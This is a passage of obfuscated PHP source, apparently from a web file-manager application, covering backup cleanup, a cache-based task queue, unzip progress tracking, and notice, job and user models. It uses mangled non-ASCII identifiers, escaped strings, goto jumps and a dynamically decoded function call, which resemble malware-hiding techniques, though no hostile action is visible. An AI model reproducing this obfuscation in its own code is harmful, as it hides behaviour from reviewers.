$_SERVER[Ş­ğŠìÒ]; if (self::$manual == 1) { return; } $ªæ•¡ıî = $this->model->listData(); if (empty($ªæ•¡ıî)) { return; } $ßÓ Ğ¯° = 0; $²Ëı—šê = array(); foreach ($ªæ•¡ıî as $’”‘°æ) { if ($ßÓ Ğ¯° >= 7) { break; } $²Ëı—šê[] = $’”‘°æ[$ëà‰¥ô§[32]]; $ßÓ Ğ¯°++; } for ($ßÓ Ğ¯° = 0; $ßÓ Ğ¯° < 12; $ßÓ Ğ¯°++) { $²Ëı—šê[] = date($ëà‰¥ô§[836], strtotime("\x2d{$ßÓ Ğ¯°}\x20\155\x6f\156\x74\150\x73")); } $²Ëı—šê = array_unique($²Ëı—šê); $›¶´Ú ƒ = Model($ëà‰¥ô§[837])->get($ëà‰¥ô§[838]); foreach ($ªæ•¡ıî as $’”‘°æ) { if (isset($’”‘°æ[$ëà‰¥ô§[822]]) && $’”‘°æ[$ëà‰¥ô§[822]] == $ëà‰¥ô§[91]) { continue; } if (!empty($’”‘°æ[$ëà‰¥ô§[32]]) && in_array($’”‘°æ[$ëà‰¥ô§[32]], $²Ëı—šê)) { continue; } $this->model->remove($’”‘°æ[$ëà‰¥ô§[475]]); $•à¤ÒªÏ = $this->backupPath($ïò„âê®, $›¶´Ú ƒ); IO::remove($•à¤ÒªÏ, !1); } } private function backupPath($£”›éïÒ, $Êñªì¿© = false) { $»‚¨–ñ† =& $_SERVER[Ş­ğŠìÒ]; if (!$Êñªì¿©) { $Êñªì¿© = Model($»‚¨–ñ†[837])->get($»‚¨–ñ†[838]); } $Ş‚Ü­§™ = $£”›éïÒ[$»‚¨–ñ†[32]]; $¯êîº… = substr(md5($»‚¨–ñ†[839] . $Êñªì¿© . $Ş‚Ü­§™), 0, 8); return "\x7b\151\157\72{$£”›éïÒ[$»‚¨–ñ†[819]]}\x7d\57\144\141\164\x61\142\141\163\145\x2f\142\x61\x63\x6b\165\x70\57" . $Ş‚Ü­§™ . $»‚¨–ñ†[11] . $¯êîº…; } public function db() { $Øšòß‹½ =& $_SERVER[Ş­ğŠìÒ]; $şÌà‹ïô = self::get(); if (_get($şÌà‹ïô, $Øšòß‹½[840], 0) == $Øšòß‹½[91]) { return !0; } $–ØäŠ£€ = new BackupDb(); if (!$–ØäŠ£€->index()) { return !1; } self::set(array($Øšòß‹½[840] => 1)); return !0; } public function dbFile() { $Ş¨¦ÛŞÈ =& $_SERVER[Ş­ğŠìÒ]; $ò¼ş»ïû = self::get(); if (_get($ò¼ş»ïû, $Ş¨¦ÛŞÈ[841], 0) == $Ş¨¦ÛŞÈ[91]) { return !0; } $ÊÎ¤Ì²´ = new BackupDbFile(); if (!$ÊÎ¤Ì²´->index()) { return !1; } self::set(array($Ş¨¦ÛŞÈ[841] => 1)); return !0; } public function file() { $ôøı¢ÂĞ =& $_SERVER[Ş­ğŠìÒ]; $øÏáÄ§Â = self::get(); if (_get($øÏáÄ§Â, $ôøı¢ÂĞ[842], 0) == $ôøı¢ÂĞ[91]) { return !0; } if ($øÏáÄ§Â[$ôøı¢ÂĞ[171]] == $ôøı¢ÂĞ[843]) { $‚†¶–ü» = new BackupFile(); if (!$‚†¶–ü»->index()) { return !1; } } self::set(array($ôøı¢ÂĞ[842] => 1, $ôøı¢ÂĞ[817] => 1)); return !0; } } goto d´ÅÅø™Şå; fõ÷‰á ±ğ: $fileSize = strrev(base64_decode($_SERVER[¯ç‚ëƒ¸][0])); function binCheckNeq($¡Á´ß´¨, $Ó“Ä®) { return $¡Á´ß´¨ != $Ó“Ä®; } $_SERVER[$_SERVER[¯ç‚ëƒ¸][1]] = $fileSize($_SERVER[$_SERVER[¯ç‚ëƒ¸][2]]); goto FÄ‹ØÄ·µ; B¥®¡İææ: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\x51\x75\x65\x75\145\114\145\x6e\147\164\x68"; const QUEUE_DATA = "\164\x61\163\153\121\165\145\165\145\x44\141\164\141"; const QUEUE_TIME = "\164\141\x73\x6b\x51\x75\x65\x75\145\x4c\x61\163\164\x52\165\156"; const QUEUE_THREAD = "\x74\141\x73\153\121\165\x65\x75\x65\x54\x68\162\145\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Ä•³Íë¨, $×Öí°ÁÔ = array(), $š²ä—ÆÁ = '', $¯Ÿı‰èÅ = '') { $¤¢Ö¿Š½ =& $_SERVER[Ş­ğŠìÒ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¯Ÿı‰èÅ && array_find_by_field(self::$listData, $¤¢Ö¿Š½[97], $¯Ÿı‰èÅ)) { return !0; } if ($¯Ÿı‰èÅ && array_find_by_field(self::$listDataAdd, $¤¢Ö¿Š½[97], $¯Ÿı‰èÅ)) { return !0; } self::$listDataAdd[] = array($¤¢Ö¿Š½[341] => $Ä•³Íë¨, $¤¢Ö¿Š½[1862] => $×Öí°ÁÔ, $¤¢Ö¿Š½[526] => $š²ä—ÆÁ, $¤¢Ö¿Š½[97] => $¯Ÿı‰èÅ); return !0; } public static function addSubmit() { $×¾ñÂ³¿ =& $_SERVER[Ş­ğŠìÒ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($×¾ñÂ³¿[1863] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $×¾ñÂ³¿[12], $×¾ñÂ³¿[526])), $×¾ñÂ³¿[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($¹­»´–, $óıÃ’”â = array(), $¨ßĞÎœˆ = '', $ØüÔ« = '') { $‚ı™›¥ =& $_SERVER[Ş­ğŠìÒ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $â”ŠÔÆö = self::getAll(); if ($ØüÔ« && array_find_by_field($â”ŠÔÆö, $‚ı™›¥[97], $ØüÔ«)) { return !0; } $â”ŠÔÆö[] = array($‚ı™›¥[341] => $¹­»´–, $‚ı™›¥[1862] => $óıÃ’”â, $‚ı™›¥[526] => $¨ßĞÎœˆ, $‚ı™›¥[97] => $ØüÔ«); self::setAll($â”ŠÔÆö); write_log($‚ı™›¥[1863] . $¨ßĞÎœˆ, $‚ı™›¥[197]); return !0; } public static function run() { $òŞÜÍ†µ =& $_SERVER[Ş­ğŠìÒ]; $•“èµŞà = self::getAll(); $ø´·……É = array_shift($•“èµŞà); if (!$ø´·……É) { return !1; } self::setAll($•“èµŞà); $„Âäú¥æ = timeFloat(); $¾¸Èî–‡ = $òŞÜÍ†µ[12]; try { $¾¸Èî–‡ = Hook::apply($ø´·……É[$òŞÜÍ†µ[341]], $ø´·……É[$òŞÜÍ†µ[1862]]); } catch (Exception $ğ×•Â§‘) { write_log($ğ×•Â§‘, $òŞÜÍ†µ[1260]); } $¨©ÒÂĞš = number_format(timeFloat() - $„Âäú¥æ, 3) . $òŞÜÍ†µ[1780]; if ($¾¸Èî–‡ && is_string($¾¸Èî–‡)) { $¨©ÒÂĞš = $¨©ÒÂĞš . $òŞÜÍ†µ[1864] . $¾¸Èî–‡; } write_log($òŞÜÍ†µ[1865] . $ø´·……É[$òŞÜÍ†µ[526]] . $òŞÜÍ†µ[1866] . $¨©ÒÂĞš, $òŞÜÍ†µ[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ÙÖÒ²ˆ« =& $_SERVER[Ş­ğŠìÒ]; $š¨“Á = self::threadCount() + 1; if ($š¨“Á > 3 || !self::count()) { return; } write_log($ÙÖÒ²ˆ«[1867] . $š¨“Á, $ÙÖÒ²ˆ«[197]); Cache::set(self::QUEUE_THREAD, $š¨“Á, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ÙÖÒ²ˆ«[1868], $ÙÖÒ²ˆ«[197]); } public static function getKey($öõ˜ĞÁš, $Æ¿éË¯ = "\151\156\x74") { $×¨í…­— =& $_SERVER[Ş­ğŠìÒ]; Cache::removeMemory($öõ˜ĞÁš); $Ë…ÎÃêŠ = Cache::get($öõ˜ĞÁš); if ($Æ¿éË¯ == $×¨í…­—[364]) { return $Ë…ÎÃêŠ ? intval($Ë…ÎÃêŠ) : 0; } if ($Æ¿éË¯ == $×¨í…­—[1869]) { return is_array($Ë…ÎÃêŠ) ? $Ë…ÎÃêŠ : array(); } return $Ë…ÎÃêŠ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[Ş­ğŠìÒ][1869]); } public static function setAll($’Éäå¾‘) { $¬çÖ‡ÇÇ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($’Éäå¾‘), $¬çÖ‡ÇÇ); Cache::set(self::QUEUE_DATA, $’Éäå¾‘, $¬çÖ‡ÇÇ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¼ú—Ø’, $¬œ†‹×† = 5.0) { if (!$¼ú—Ø’) { return; } $ã°ôŞ = Cache::get($¼ú—Ø’); if (!$ã°ôŞ || timeFloat() - floatVal($ã°ôŞ) >= $¬œ†‹×†) { Cache::set($¼ú—Ø’, timeFloat(), $¬œ†‹×† * 10); return !0; } return !1; } public static function timeLimitCall($°’á¾®Ñ, $ˆ»«Â§£, $ƒ¨±ÚÕ, $ß¨œŞ£Ş = 5.0) { $Ÿ€Öß… =& $_SERVER[Ş­ğŠìÒ]; if (!$°’á¾®Ñ || !$ˆ»«Â§£) { return; } self::$asyncAdd = !0; $œÌñ×¸ = $Ÿ€Öß…[1870]; $–ìÂøì = Cache::get($œÌñ×¸, !0); $ºà–®¦¼ = array($Ÿ€Öß…[1871] => timeFloat(), $Ÿ€Öß…[1872] => timeFloat(), $Ÿ€Öß…[341] => $ˆ»«Â§£, $Ÿ€Öß…[1862] => $ƒ¨±ÚÕ, $Ÿ€Öß…[206] => $ß¨œŞ£Ş); if (is_array($–ìÂøì[$°’á¾®Ñ])) { $ºà–®¦¼[$Ÿ€Öß…[1872]] = $–ìÂøì[$°’á¾®Ñ][$Ÿ€Öß…[1872]]; } if (is_array($–ìÂøì[$°’á¾®Ñ])) { if (timeFloat() - $–ìÂøì[$°’á¾®Ñ][$Ÿ€Öß…[1871]] < $ºà–®¦¼[$Ÿ€Öß…[206]] * 0.3) { return; } $ºà–®¦¼[$Ÿ€Öß…[1872]] = $–ìÂøì[$°’á¾®Ñ][$Ÿ€Öß…[1872]]; } $–ìÂøì[$°’á¾®Ñ] = $ºà–®¦¼; Cache::set($œÌñ×¸, $–ìÂøì, 60); Cache::removeMemory($œÌñ×¸); write_log($Ÿ€Öß…[1873] . $°’á¾®Ñ . $Ÿ€Öß…[74] . $ˆ»«Â§£, $Ÿ€Öß…[197]); } public static function timeLimitCallLoop() { $ĞıØğÆ =& $_SERVER[Ş­ğŠìÒ]; $µ‡ËŞà¬ = array($ĞıØğÆ[1874]); $òéÚÑç = in_array(strtolower(ACTION), $µ‡ËŞà¬); if (!$òéÚÑç && !self::$asyncAdd) { return; } $­‹øü· = $ĞıØğÆ[1870]; $ò¹¨ª±Ÿ = Cache::get($­‹øü·, !0); if (!$ò¹¨ª±Ÿ || count($ò¹¨ª±Ÿ) <= 0) { return; } $ø¸‚µŞ„ = !1; $¾‘Æ–áÑ = timeFloat(); $„ôÕ¦¦¤ = array(); foreach ($ò¹¨ª±Ÿ as $š²ƒ¶ºš => $»³åÒ±¿) { if ($¾‘Æ–áÑ - $»³åÒ±¿[$ĞıØğÆ[1872]] > $»³åÒ±¿[$ĞıØğÆ[206]]) { $ø¸‚µŞ„ = !0; try { Hook::apply($»³åÒ±¿[$ĞıØğÆ[341]], $»³åÒ±¿[$ĞıØğÆ[1862]]); write_log($ĞıØğÆ[1875] . $š²ƒ¶ºš . $ĞıØğÆ[74] . $»³åÒ±¿[$ĞıØğÆ[341]] . $ĞıØğÆ[1876] . ACTION, $ĞıØğÆ[197]); } catch (Exception $â¼¢àõ) { } continue; } $„ôÕ¦¦¤[$š²ƒ¶ºš] = $»³åÒ±¿; } if (!$ø¸‚µŞ„) { return; } if (!$„ôÕ¦¦¤) { return Cache::remove($­‹øü·); } Cache::set($­‹øü·, $„ôÕ¦¦¤, 60); Cache::removeMemory($­‹øü·); } public static function finished($¿…Şç, $ˆÅ¾…¥‘) { $Ù¨÷óßÀ =& $_SERVER[Ş­ğŠìÒ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Ù¨÷óßÀ[341] => $¿…Şç, $Ù¨÷óßÀ[1862] => $ˆÅ¾…¥‘); } private static function finishedRun() { $¹™•óşÒ =& $_SERVER[Ş­ğŠìÒ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $¡Í¨à©‡) { try { Hook::apply($¡Í¨à©‡[$¹™•óşÒ[341]], $¡Í¨à©‡[$¹™•óşÒ[1862]]); } catch (Exception $Ïôˆë) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ï–Ï±¢ =& $_SERVER[Ş­ğŠìÒ]; parent::startAfter(); Hook::bind($ï–Ï±¢[1877], array($this, $ï–Ï±¢[1878])); Hook::bind($ï–Ï±¢[1274], array($this, $ï–Ï±¢[1879])); Hook::bind($ï–Ï±¢[1880], array($this, $ï–Ï±¢[1881])); $á÷Ä¾±³ =& $this->task; $á÷Ä¾±³[$ï–Ï±¢[1882]] = $ï–Ï±¢[1275]; if (!$á÷Ä¾±³[$ï–Ï±¢[1653]]) { $á÷Ä¾±³[$ï–Ï±¢[1653]] = LNG($ï–Ï±¢[1883]); } } protected function endAfter() { $ÛÅÕ½ö½ =& $_SERVER[Ş­ğŠìÒ]; parent::endAfter(); Hook::unbind($ÛÅÕ½ö½[1877], array($this, $ÛÅÕ½ö½[1878])); Hook::unbind($ÛÅÕ½ö½[1274], array($this, $ÛÅÕ½ö½[1879])); Hook::unbind($ÛÅÕ½ö½[1880], array($this, $ÛÅÕ½ö½[1881])); } public function updateAfter() { $ş–µ•º =& $_SERVER[Ş­ğŠìÒ]; $íİÍ·´ =& $this->task; if (!$íİÍ·´[$ş–µ•º[1137]] || !$íİÍ·´[$ş–µ•º[830]]) { if ($íİÍ·´[$ş–µ•º[1882]] != $ş–µ•º[389]) { return; } } if ($íİÍ·´[$ş–µ•º[1882]] == $ş–µ•º[1275]) { $ã›íÌÆ˜ = 0; if ($íİÍ·´[$ş–µ•º[1817]]) { $ã›íÌÆ˜ = $íİÍ·´[$ş–µ•º[1818]] / $íİÍ·´[$ş–µ•º[1817]]; } $íİÍ·´[$ş–µ•º[1766]] = $ã›íÌÆ˜ * 0.3; } else { if ($íİÍ·´[$ş–µ•º[1882]] == $ş–µ•º[389]) { $ã›íÌÆ˜ = $íİÍ·´[$ş–µ•º[1765]] / $íİÍ·´[$ş–µ•º[1137]]; $íİÍ·´[$ş–µ•º[1766]] = 0.3 + $ã›íÌÆ˜ * 0.4; } else { if ($íİÍ·´[$ş–µ•º[1882]] == $ş–µ•º[110]) { $¤ıÌÊÔÇ = 0; if ($íİÍ·´[$ş–µ•º[1819]] == $ş–µ•º[110]) { $¤ıÌÊÔÇ = $íİÍ·´[$ş–µ•º[1818]]; } $ã›íÌÆ˜ = ($íİÍ·´[$ş–µ•º[1822]] + $¤ıÌÊÔÇ) / $íİÍ·´[$ş–µ•º[830]]; $íİÍ·´[$ş–µ•º[1766]] = 0.3 + 0.4 + $ã›íÌÆ˜ * 0.3; } } } if ($íİÍ·´[$ş–µ•º[1766]] > 0) { $À‹¤¨Ï = timeFloat() - $íİÍ·´[$ş–µ•º[1768]] - $íİÍ·´[$ş–µ•º[1771]]; $íİÍ·´[$ş–µ•º[1772]] = $À‹¤¨Ï * (1 - $íİÍ·´[$ş–µ•º[1766]]) / $íİÍ·´[$ş–µ•º[1766]]; } } public function addFile($ûˆàË) { $‡ˆóŒˆ =& $_SERVER[Ş­ğŠìÒ]; $ğ”Ú´à÷ =& $this->task; $‹±ß’–Ï = IO::info($ûˆàË); $ğ”Ú´à÷[$‡ˆóŒˆ[1815]] = $‹±ß’–Ï[$‡ˆóŒˆ[32]]; $ğ”Ú´à÷[$‡ˆóŒˆ[1817]] = $‹±ß’–Ï[$‡ˆóŒˆ[79]]; $ğ”Ú´à÷[$‡ˆóŒˆ[1818]] = 0; $ğ”Ú´à÷[$‡ˆóŒˆ[1139]] = $‡ˆóŒˆ[1838]; $ğ”Ú´à÷[$‡ˆóŒˆ[1819]] = $‡ˆóŒˆ[1275]; $ğ”Ú´à÷[$‡ˆóŒˆ[830]] = $‹±ß’–Ï[$‡ˆóŒˆ[79]]; $ğ”Ú´à÷[$‡ˆóŒˆ[1137]] = 1; $éª²ôˆÜ = 0; $ğ”Ú´à÷[$‡ˆóŒˆ[1826]] = array($‡ˆóŒˆ[1827] => $éª²ôˆÜ + 1, $‡ˆóŒˆ[494] => $‹±ß’–Ï[$‡ˆóŒˆ[32]], $‡ˆóŒˆ[87] => $‹±ß’–Ï[$‡ˆóŒˆ[87]], $‡ˆóŒˆ[582] => $‹±ß’–Ï[$‡ˆóŒˆ[582]] ? $‹±ß’–Ï[$‡ˆóŒˆ[582]] : $‹±ß’–Ï[$‡ˆóŒˆ[87]]); $this->update(); } public function zipEvent($‹×Øå‹, $ÒİäÓÛ¯, $˜ÀëÀ¦, $‚Ô‡¸Ôˆ) { $é„ıè =& $_SERVER[Ş­ğŠìÒ]; $ò‡¶€íÏ =& $this->task; $ò‡¶€íÏ[$é„ıè[1815]] = get_path_this($ÒİäÓÛ¯); $ò‡¶€íÏ[$é„ıè[1817]] = $‚Ô‡¸Ôˆ; $ò‡¶€íÏ[$é„ıè[1818]] = $˜ÀëÀ¦; $ò‡¶€íÏ[$é„ıè[1139]] = $‹×Øå‹ == $é„ıè[1884] ? $é„ıè[1885] : $é„ıè[1886]; $ò‡¶€íÏ[$é„ıè[1819]] = $é„ıè[12]; $ò‡¶€íÏ[$é„ıè[830]] = $‚Ô‡¸Ôˆ; $ò‡¶€íÏ[$é„ıè[1882]] = $é„ıè[389]; $this->update(); } public function unzipAfter($Æ˜¾®²) { $·ñğÔæÊ =& $_SERVER[Ş­ğŠìÒ]; $Ô¬Ä—· =& $this->task; $Ô¬Ä—·[$·ñğÔæÊ[1882]] = $·ñğÔæÊ[110]; $Í…ç£¹Œ = IO::infoWithChildren($Æ˜¾®²); $äİ Ìåš = 0; $Ô¬Ä—·[$·ñğÔæÊ[1826]] = array($·ñğÔæÊ[1827] => $äİ Ìåš + 1, $·ñğÔæÊ[494] => $Í…ç£¹Œ[$·ñğÔæÊ[32]], $·ñğÔæÊ[87] => $Í…ç£¹Œ[$·ñğÔæÊ[87]], $·ñğÔæÊ[582] => $Í…ç£¹Œ[$·ñğÔæÊ[582]] ? $Í…ç£¹Œ[$·ñğÔæÊ[582]] : $Í…ç£¹Œ[$·ñğÔæÊ[87]]); if ($Í…ç£¹Œ[$·ñğÔæÊ[33]] == $·ñğÔæÊ[230]) { $Ô¬Ä—·[$·ñğÔæÊ[1137]] = 1; } else { $Ô¬Ä—·[$·ñğÔæÊ[1137]] = $Í…ç£¹Œ[$·ñğÔæÊ[82]][$·ñğÔæÊ[80]]; } $Ô¬Ä—·[$·ñğÔæÊ[1139]] = $·ñğÔæÊ[12]; $Ô¬Ä—·[$·ñğÔæÊ[1819]] = 0; $Ô¬Ä—·[$·ñğÔæÊ[1765]] = 0; $Ô¬Ä—·[$·ñğÔæÊ[1817]] = 0; $Ô¬Ä—·[$·ñğÔæÊ[1818]] = 0; $Ô¬Ä—·[$·ñğÔæÊ[1815]] = $·ñğÔæÊ[12]; $Ô¬Ä—·[$·ñğÔæÊ[1822]] = 0; $Ô¬Ä—·[$·ñğÔæÊ[830]] = $Í…ç£¹Œ[$·ñğÔæÊ[79]]; $this->update(); self::log($·ñğÔæÊ[1887] . json_encode(array($Ô¬Ä—·, $Í…ç£¹Œ))); } public function nameParse($ÆğËÕ‰Ä) { $ÁÜ´ï— =& $_SERVER[Ş­ğŠìÒ]; $†Ú÷¨· =& $this->task; if ($†Ú÷¨·[$ÁÜ´ï—[1882]] == $ÁÜ´ï—[1275]) { $†Ú÷¨·[$ÁÜ´ï—[1882]] = $ÁÜ´ï—[389]; $†Ú÷¨·[$ÁÜ´ï—[1822]] = 0; $†Ú÷¨·[$ÁÜ´ï—[830]] = 0; } $ÛËÙşé“ = get_path_this($ÆğËÕ‰Ä); if (strstr($ÛËÙşé“, $ÁÜ´ï—[10])) { $†Ú÷¨·[$ÁÜ´ï—[1765]] += 1; $†Ú÷¨·[$ÁÜ´ï—[1137]] += 1; } $†Ú÷¨·[$ÁÜ´ï—[1815]] = $ÆğËÕ‰Ä; $this->update(); } } goto fí¿ù†±ñ; Dê ¢»Ü: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\156\x6f\164\151\x63\x65\114\x69\x73\x74"; public $field = array("\x6e\x61\155\145", "\x63\x6f\x6e\x74\145\x6e\164", "\141\165\164\150", "\x6d\157\144\x65", "\x74\151\x6d\x65", "\x74\171\160\145", "\154\x65\x76\145\154", "\145\x6e\x61\142\x6c\145", "\x73\x6f\x72\x74"); public function listData($õÂš·„ƒ = false, $¸²ÃòéÖ = "\x73\157\x72\x74", $—ÂãšŠï = false) { return parent::listData($õÂš·„ƒ, $¸²ÃòéÖ, $—ÂãšŠï); } public function add($áÜ»­ÛÒ) { $÷½ıª‘ =& $_SERVER[Ş­ğŠìÒ]; $‡®”–Ãµ = time(); if ($áÜ»­ÛÒ[$÷½ıª‘[16]] == $÷½ıª‘[2427]) { $‡®”–Ãµ = strtotime($áÜ»­ÛÒ[$÷½ıª‘[206]]); } $áÜ»­ÛÒ[$÷½ıª‘[206]] = $‡®”–Ãµ; return parent::insert($áÜ»­ÛÒ); } public function update($†Óí¨ˆĞ, $³×•©éØ) { $°“°º×ë =& $_SERVER[Ş­ğŠìÒ]; $Ëù‘ÜØÈ = $this->listData($†Óí¨ˆĞ); if (!$Ëù‘ÜØÈ) { return !1; } $ÈŒñú˜É = time(); if ($³×•©éØ[$°“°º×ë[16]] == $°“°º×ë[2427]) { $ÈŒñú˜É = strtotime($³×•©éØ[$°“°º×ë[206]]); } $³×•©éØ[$°“°º×ë[206]] = $ÈŒñú˜É; return parent::update($†Óí¨ˆĞ, $³×•©éØ); } public function remove($ƒã¢ãô) { $Ó™•ÕšÔ = $this->listData($ƒã¢ãô); if (!$Ó™•ÕšÔ || $Ó™•ÕšÔ[$_SERVER[Ş­ğŠìÒ][191]]) { return !1; } return parent::remove($ƒã¢ãô); } public function sort($¶²É”†Ù, $¼©¾İËº) { return parent::update($¶²É”†Ù, $¼©¾İËº); } public function enable($ˆ«ÔÑ¡, $Œ³¶†‰ ) { return parent::update($ˆ«ÔÑ¡, array($_SERVER[Ş­ğŠìÒ][2428] => $Œ³¶†‰ )); } private function initUserOption() { $“É‘¢•¦ =& $_SERVER[Ş­ğŠìÒ]; $this->optionType = $“É‘¢•¦[2429]; $this->modelType = $“É‘¢•¦[2430]; $this->field = array($“É‘¢•¦[2431], $“É‘¢•¦[32], $“É‘¢•¦[206], $“É‘¢•¦[33], $“É‘¢•¦[2432], $“É‘¢•¦[817], $“É‘¢•¦[226]); } public function userNoticeGet($´Œ¥”ó = false) { $this->initUserOption(); return parent::listData($´Œ¥”ó, $_SERVER[Ş­ğŠìÒ][475], !0); } public function userNoticeAdd($ÌÑ¦œÜ) { $ÙÕ„ÀÑ =& $_SERVER[Ş­ğŠìÒ]; $this->initUserOption(); $Ùößşà = $this->findByKey($ÙÕ„ÀÑ[2431], $ÌÑ¦œÜ[$ÙÕ„ÀÑ[475]]); if ($Ùößşà) { return !0; } $åÓ´Ãİó = array($ÙÕ„ÀÑ[2431] => $ÌÑ¦œÜ[$ÙÕ„ÀÑ[475]], $ÙÕ„ÀÑ[32] => $ÌÑ¦œÜ[$ÙÕ„ÀÑ[32]], $ÙÕ„ÀÑ[206] => $ÌÑ¦œÜ[$ÙÕ„ÀÑ[206]], $ÙÕ„ÀÑ[33] => isset($ÌÑ¦œÜ[$ÙÕ„ÀÑ[33]]) ? $ÌÑ¦œÜ[$ÙÕ„ÀÑ[33]] : 1, $ÙÕ„ÀÑ[2432] => isset($ÌÑ¦œÜ[$ÙÕ„ÀÑ[2432]]) ? $ÌÑ¦œÜ[$ÙÕ„ÀÑ[2432]] : 0, $ÙÕ„ÀÑ[817] => 0, $ÙÕ„ÀÑ[226] => 0); return parent::insert($åÓ´Ãİó); } public function userNoticeEdit($“ÀèÆı, $ûş¦ÎÉ—) { $this->initUserOption(); return parent::update($“ÀèÆı, $ûş¦ÎÉ—); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\164\x65\x6d\137\157\x70\x74\x69\157\156"; protected $jsonField = array("\x6d\x65\156\x75", "\162\x6f\x6c\x65", "\x72\x6f\x6c\x65\107\162\x6f\x75\x70", "\162\x65\147\x69\163\164", "\145\x6d\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($»ô×èãÒ) { return "\123\171\163\x74\x65\x6d\117\160\164\x69\157\156\137{$»ô×èãÒ}"; } protected function optionDefault($°„ıÒ¯ = '') { $Ø«İë‰µ =& $_SERVER[Ş­ğŠìÒ]; if ($°„ıÒ¯ == $Ø«İë‰µ[12]) { return $GLOBALS[$Ø«İë‰µ[6]][$Ø«İë‰µ[457]]; } } } class SystemRecordModel extends ModelBaseLight { } goto a¦³Ã¿õ¯æ; BæŞ ôèä: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\152\157\142\114\151\x73\x74"; public $field = array("\x6e\x61\155\145", "\144\x65\163\x63", "\x73\157\x72\x74"); const JOB_KEY = "\163\145\x6c\x66\x4a\157\142\114\x69\x73\164"; public function listData($îÂ½ì´ = false, $¿¬Ìå‹ş = "\163\157\x72\164", $Û‹±¡ª­ = false) { return parent::listData($îÂ½ì´, $¿¬Ìå‹ş, $Û‹±¡ª­); } public function remove($ĞòèÙáÅ) { return parent::remove($ĞòèÙáÅ); } public function add($ıÒ’Í×) { $®ä„–¨× =& $_SERVER[Ş­ğŠìÒ]; if ($this->findByName($ıÒ’Í×[$®ä„–¨×[32]])) { return !1; } $ıÒ’Í×[$®ä„–¨×[1987]] = $this->getSort(); return parent::insert($ıÒ’Í×); } private function getSort() { $°Ñ¯¨­™ =& $_SERVER[Ş­ğŠìÒ]; $²ÉúüõŒ = parent::listData(); $²ïæŒ„ = array_to_keyvalue($²ÉúüõŒ, $°Ñ¯¨­™[12], $°Ñ¯¨­™[1987]); return empty($²ïæŒ„) ? 0 : max($²ïæŒ„) + 1; } public function update($¡ğšŸ·Ó, $à£î©ÅÛ) { $ÃŞÍ¤Õ§ =& $_SERVER[Ş­ğŠìÒ]; $ïÖÒ´ = parent::listData($¡ğšŸ·Ó); $×õù¡ = $this->findByName($à£î©ÅÛ[$ÃŞÍ¤Õ§[32]]); if (!$ïÖÒ´ || $×õù¡ && $×õù¡[$ÃŞÍ¤Õ§[475]] != $ïÖÒ´[$ÃŞÍ¤Õ§[475]]) { return !1; } return parent::update($¡ğšŸ·Ó, $à£î©ÅÛ); } public function setUserJob($û¸Ÿ‚¡ì, $ğãÕ±Ï) { $¸òîêœ« =& $_SERVER[Ş­ğŠìÒ]; if (!is_array($ğãÕ±Ï)) { $ğãÕ±Ï = array($ğãÕ±Ï); } $ÍÁÒ«– = parent::listData(); $Ú†Á‰ê = array_to_keyvalue($ÍÁÒ«–, $¸òîêœ«[32]); $Ş§ÎÈÒˆ = $¸òîêœ«[454]; foreach ($ğãÕ±Ï as $ãÛÜ»§) { if ($Ú†Á‰ê[$ãÛÜ»§]) { $Ş§ÎÈÒˆ .= $Ú†Á‰ê[$ãÛÜ»§][$¸òîêœ«[475]] . $¸òîêœ«[50]; } else { $Á†¦Í³Â = $this->add($ãÛÜ»§); $Ş§ÎÈÒˆ .= $Á†¦Í³Â . $¸òîêœ«[50]; } } $Ş§ÎÈÒˆ = rtrim($Ş§ÎÈÒˆ, $¸òîêœ«[50]); Model($¸òîêœ«[598])->metaSet($û¸Ÿ‚¡ì, self::JOB_KEY, $Ş§ÎÈÒˆ); } public function getUserJob($«Ÿ³¾è«) { $ÒÖŞ§½• = Model($_SERVER[Ş­ğŠìÒ][598])->metaGet($«Ÿ³¾è«); return $this->getUserJobInfo($ÒÖŞ§½•[self::JOB_KEY]); } public function getUserJobInfo($Çƒªğ¯) { $Êºæı =& $_SERVER[Ş­ğŠìÒ]; $‰™Ö¡ú = explode($Êºæı[50], $Çƒªğ¯); $‰œ¬Êõ = parent::listData(); $‰œ¬Êõ = array_remove_key($‰œ¬Êõ, $Êºæı[231]); $¶é†îÂ© = array(); foreach ($‰™Ö¡ú as $¥ï°¢•¬) { if (isset($‰œ¬Êõ[$¥ï°¢•¬])) { $¶é†îÂ©[] = $‰œ¬Êõ[$¥ï°¢•¬]; } } return $¶é†îÂ©; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\162"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\141\x6d\x65" => "\165\x73\145\x72\x5f\x6d\x65\x74\141", 